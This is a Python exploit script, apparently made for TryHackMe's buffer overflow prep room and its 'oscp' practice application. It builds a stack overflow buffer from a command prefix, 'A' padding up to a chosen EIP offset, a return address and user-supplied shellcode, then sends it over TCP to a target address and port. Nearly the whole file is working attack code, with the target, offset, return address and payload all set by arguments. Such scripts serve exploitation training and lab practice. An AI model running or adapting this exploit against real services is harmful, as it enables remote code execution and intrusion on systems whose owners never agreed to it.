#!/usr/bin/env python3

"""
This works against TryHackMe buffer overflow prep room's "oscp" application. 
"""

import argparse
import socket

parser = argparse.ArgumentParser()
parser.add_argument("-I", "--ip-address", help="IP address of target machine")
parser.add_argument("-P", "--port", help="PORT application is listening on.", default=1337, nargs='?', type=int,
                    const=1337)
parser.add_argument("-S", "--string-prefix", help="STRING PREFIX for app", default='OVERFLOW1 ')
parser.add_argument("-O", "--offset", help="OFFSET for EIP", default=0, nargs='?', type=int, const=0)
parser.add_argument("-R", "--retn", help="NEAR RETURN", default="", nargs='?', type=str, const="")
parser.add_argument("-L", "--payload", help="PAYLOAD", default="", nargs='?', type=str, const="")

# default
ip = "10.10.10.10"
port = 1337
prefix = "OVERFLOW1 "
offset = 0
retn = ""
payload = ""

args = parser.parse_args()

if args.ip_address:
    ip = args.ip_address
if args.port:
    port = args.port
if args.string_prefix:
    prefix = args.string_prefix
if args.offset:
    offset = args.offset
if args.retn:
    retn = args.retn
if args.payload:
    payload = args.payload

overflow = "A" * offset
padding = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

print("Sending exploit to {}:{}".format(ip, port))
print("buffer: {}".format(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

